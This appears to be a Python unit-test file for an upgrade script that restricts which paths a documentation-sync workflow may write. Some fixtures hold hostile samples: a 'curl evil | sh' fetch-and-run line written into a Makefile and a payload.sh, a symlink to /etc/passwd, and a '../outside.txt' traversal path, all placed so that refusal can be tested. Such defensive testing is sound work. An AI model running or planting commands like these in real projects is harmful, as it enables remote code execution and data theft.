#!/usr/bin/env python3
"""Unit tests for scripts/stage-upgrade.py — the upgrade lane's path authority.

Runs the script as a subprocess (its contract is the CLI the workflow calls),
against temporary install and scratch trees. What is asserted is the boundary
the aj604/toolshed#127 trust split rests on: a regeneration that wrote outside
the wiring the upgrade engine owns is refused whole, and the credentialed job
re-derives that same authority from the manifest rather than trusting it.

Run: python3 tests/scripts/stage-upgrade_test.py
"""

import hashlib
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import unittest

SCRIPT = str(
    pathlib.Path(__file__).resolve().parents[2]
    / "plugins" / "doc-lifecycle" / "skills" / "scheduling-doc-sync"
    / "scripts" / "stage-upgrade.py"
)

# A minimal install: one of each ownership class the upgrade engine writes.
INSTALL = {
    ".github/doc-sync/installed-version": "0.1.0\n",
    ".github/doc-sync/render-report.py": "# old renderer\n",
    ".github/doc-sync/engine/doclifecycle/__init__.py": "OLD = 1\n",
    ".github/workflows/doc-sync.yml": "name: doc-sync\n",
    # Consumer state an upgrade preserves — never in an authorized path set.
    ".github/doc-sync-marker": "abc123\n",
    ".github/doc-sync/audit-scope.json": '{"exclude": []}\n',
    ".doc-lifecycle/registry.json": '{"rules": []}\n',
}


def write(root, rel, text):
    path = pathlib.Path(root) / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


def build(root, files):
    for rel, text in files.items():
        write(root, rel, text)


def run(*argv):
    return subprocess.run([sys.executable, SCRIPT, *argv],
                          capture_output=True, text=True)


def sha256(text):
    return hashlib.sha256(text.encode()).hexdigest()


class StageUpgradeTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.repo = os.path.join(self.tmp, "repo")
        self.scratch = os.path.join(self.tmp, "scratch")
        self.bundle = os.path.join(self.tmp, "bundle")
        build(self.repo, INSTALL)
        build(self.scratch, INSTALL)

    def manifest(self, target="0.2.0"):
        return run("manifest", "--scratch", self.scratch, "--repo", self.repo,
                   "--target", target, "--bundle", self.bundle)

    def read_manifest(self):
        with open(os.path.join(self.bundle, "manifest.json")) as f:
            return json.load(f)

    def entries(self):
        return {e["path"]: e["status"] for e in self.read_manifest()["entries"]}


class Manifest(StageUpgradeTestCase):
    def test_an_identical_scratch_tree_produces_an_empty_manifest(self):
        r = self.manifest()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.read_manifest()["entries"], [])

    def test_it_reports_added_modified_and_removed_wiring(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        write(self.scratch, ".github/doc-sync/stage-upgrade.py", "# new\n")
        os.remove(os.path.join(
            self.scratch, ".github/doc-sync/engine/doclifecycle/__init__.py"))
        r = self.manifest()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.entries(), {
            ".github/doc-sync/installed-version": "M",
            ".github/doc-sync/stage-upgrade.py": "A",
            ".github/doc-sync/engine/doclifecycle/__init__.py": "D",
        })

    def test_it_bundles_the_bytes_of_every_written_path(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        bundled = pathlib.Path(
            self.bundle, "files", ".github/doc-sync/installed-version")
        self.assertEqual(bundled.read_text(), "0.2.0\n")
        entry, = self.read_manifest()["entries"]
        self.assertEqual(entry["sha256"], sha256("0.2.0\n"))

    def test_the_target_travels_in_the_manifest(self):
        self.assertEqual(self.manifest("1.2.3").returncode, 0)
        self.assertEqual(self.read_manifest()["target"], "1.2.3")

    # --- refusals: the boundary this script exists to draw -----------------

    def assert_refused(self, r, needle):
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn(needle, r.stderr)
        self.assertIn("nothing staged", r.stderr)
        self.assertFalse(os.path.exists(os.path.join(self.bundle,
                                                     "manifest.json")))

    def test_it_refuses_a_regeneration_that_rewrote_the_marker(self):
        write(self.scratch, ".github/doc-sync-marker", "tampered\n")
        self.assert_refused(self.manifest(), ".github/doc-sync-marker")

    def test_it_refuses_a_regeneration_that_rewrote_the_audit_scope(self):
        write(self.scratch, ".github/doc-sync/audit-scope.json", '{"x": 1}\n')
        self.assert_refused(self.manifest(),
                            ".github/doc-sync/audit-scope.json")

    def test_it_refuses_a_regeneration_that_rewrote_the_registry(self):
        write(self.scratch, ".doc-lifecycle/registry.json", '{"rules": [1]}\n')
        self.assert_refused(self.manifest(), ".doc-lifecycle/registry.json")

    def test_it_refuses_a_write_outside_the_wiring_roots(self):
        write(self.scratch, "Makefile", "all:\n\tcurl evil | sh\n")
        self.assert_refused(self.manifest(), "outside the wiring roots")

    def test_it_refuses_a_workflow_the_lane_does_not_own(self):
        write(self.scratch, ".github/workflows/release.yml", "name: release\n")
        self.assert_refused(self.manifest(), ".github/workflows/release.yml")

    def test_it_refuses_a_non_python_drop_into_the_script_directory(self):
        write(self.scratch, ".github/doc-sync/payload.sh", "curl evil | sh\n")
        self.assert_refused(self.manifest(), ".github/doc-sync/payload.sh")

    def test_it_refuses_a_symlink(self):
        os.symlink("/etc/passwd",
                   os.path.join(self.scratch, ".github/doc-sync/leak.py"))
        self.assert_refused(self.manifest(), "symlink")

    def test_it_names_every_offender_not_the_first(self):
        write(self.scratch, "Makefile", "x\n")
        write(self.scratch, ".github/doc-sync-marker", "y\n")
        r = self.manifest()
        self.assertIn("Makefile", r.stderr)
        self.assertIn(".github/doc-sync-marker", r.stderr)
        self.assertIn("FAILED: 2 path(s)", r.stderr)


class Apply(StageUpgradeTestCase):
    def setUp(self):
        super().setUp()
        self.dest = os.path.join(self.tmp, "dest")
        build(self.dest, INSTALL)
        self.out = os.path.join(self.tmp, "staged.txt")

    def apply(self, target="0.2.0"):
        return run("apply", "--bundle", self.bundle, "--repo", self.dest,
                   "--target", target, "--out", self.out)

    def staged(self):
        with open(self.out, "rb") as f:
            return [p.decode() for p in f.read().split(b"\0") if p]

    def rewrite_manifest(self, mutate):
        data = self.read_manifest()
        mutate(data)
        with open(os.path.join(self.bundle, "manifest.json"), "w") as f:
            json.dump(data, f)

    def test_it_transfers_writes_and_removals_and_lists_them(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        write(self.scratch, ".github/doc-sync/stage-upgrade.py", "# new\n")
        os.remove(os.path.join(
            self.scratch, ".github/doc-sync/engine/doclifecycle/__init__.py"))
        self.assertEqual(self.manifest().returncode, 0)

        r = self.apply()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(
            pathlib.Path(self.dest, ".github/doc-sync/installed-version"
                         ).read_text(), "0.2.0\n")
        self.assertTrue(os.path.isfile(os.path.join(
            self.dest, ".github/doc-sync/stage-upgrade.py")))
        self.assertFalse(os.path.exists(os.path.join(
            self.dest, ".github/doc-sync/engine/doclifecycle/__init__.py")))
        self.assertEqual(sorted(self.staged()), [
            ".github/doc-sync/engine/doclifecycle/__init__.py",
            ".github/doc-sync/installed-version",
            ".github/doc-sync/stage-upgrade.py",
        ])

    def test_it_leaves_consumer_state_alone(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        self.assertEqual(self.apply().returncode, 0)
        self.assertEqual(
            pathlib.Path(self.dest, ".github/doc-sync-marker").read_text(),
            INSTALL[".github/doc-sync-marker"])

    def test_it_refuses_a_bundle_for_another_version(self):
        self.assertEqual(self.manifest("0.9.0").returncode, 0)
        r = self.apply("0.2.0")
        self.assertEqual(r.returncode, 2)
        self.assertIn("dispatched for", r.stderr)

    # The credentialed job re-derives the authority; a manifest edited between
    # the two jobs must not buy a write the manifest step would have refused.
    def test_it_re_derives_the_authority_from_the_manifest(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        write(self.bundle, "files/Makefile", "all:\n\tcurl evil | sh\n")
        self.rewrite_manifest(lambda d: d["entries"].append(
            {"status": "A", "path": "Makefile",
             "sha256": sha256("all:\n\tcurl evil | sh\n")}))
        r = self.apply()
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("Makefile", r.stderr)
        self.assertFalse(os.path.exists(os.path.join(self.dest, "Makefile")))

    def test_it_refuses_a_path_that_escapes_the_repository(self):
        self.assertEqual(self.manifest().returncode, 0)
        self.rewrite_manifest(lambda d: d["entries"].append(
            {"status": "A", "path": "../outside.txt", "sha256": sha256("x")}))
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("escapes the repository", r.stderr)

    def test_it_refuses_a_file_whose_bytes_do_not_match_the_digest(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        write(self.bundle, "files/.github/doc-sync/installed-version",
              "9.9.9\n")
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("does not match the digest", r.stderr)
        self.assertEqual(
            pathlib.Path(self.dest, ".github/doc-sync/installed-version"
                         ).read_text(), "0.1.0\n")

    def test_it_refuses_a_bundle_carrying_an_unnamed_file(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        write(self.bundle, "files/.github/workflows/doc-evil.yml", "name: x\n")
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("the manifest does not name", r.stderr)

    def test_it_refuses_a_manifest_entry_with_no_bundled_file(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        os.remove(os.path.join(self.bundle,
                               "files/.github/doc-sync/installed-version"))
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("no regular file", r.stderr)

    def test_it_refuses_something_that_is_not_a_bundle_manifest(self):
        os.makedirs(self.bundle, exist_ok=True)
        with open(os.path.join(self.bundle, "manifest.json"), "w") as f:
            json.dump({"artifact": "edit-plan", "operations": []}, f)
        r = self.apply()
        self.assertEqual(r.returncode, 2)
        self.assertIn("upgrade-bundle", r.stderr)

    def test_nothing_is_transferred_when_anything_is_refused(self):
        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        self.rewrite_manifest(lambda d: d["entries"].append(
            {"status": "A", "path": ".github/doc-sync-marker",
             "sha256": sha256("x")}))
        self.assertEqual(self.apply().returncode, 1)
        self.assertEqual(
            pathlib.Path(self.dest, ".github/doc-sync/installed-version"
                         ).read_text(), "0.1.0\n")


class Verify(StageUpgradeTestCase):
    def files(self, paths, staged, unstaged):
        out = []
        for name, values in (("paths", paths), ("staged", staged),
                             ("unstaged", unstaged)):
            path = os.path.join(self.tmp, f"{name}.txt")
            with open(path, "wb") as f:
                for v in values:
                    f.write(v.encode() + b"\0")
            out.append(path)
        return out

    def test_an_exact_match_passes(self):
        p, s, u = self.files(["a.md", "b.md"], ["a.md", "b.md"], [])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_a_staged_path_nobody_authorized_fails(self):
        p, s, u = self.files(["a.md"], ["a.md", "Makefile"], [])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 1)
        self.assertIn("Makefile", r.stderr)

    def test_a_leftover_working_tree_change_fails(self):
        p, s, u = self.files(["a.md"], ["a.md"], ["stray.txt"])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 1)
        self.assertIn("stray.txt", r.stderr)

    def test_a_shorter_staged_list_is_reported_not_refused(self):
        p, s, u = self.files(["a.md", "b.md"], ["a.md"], [])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("1 of 2", r.stderr)


if __name__ == "__main__":
    unittest.main()
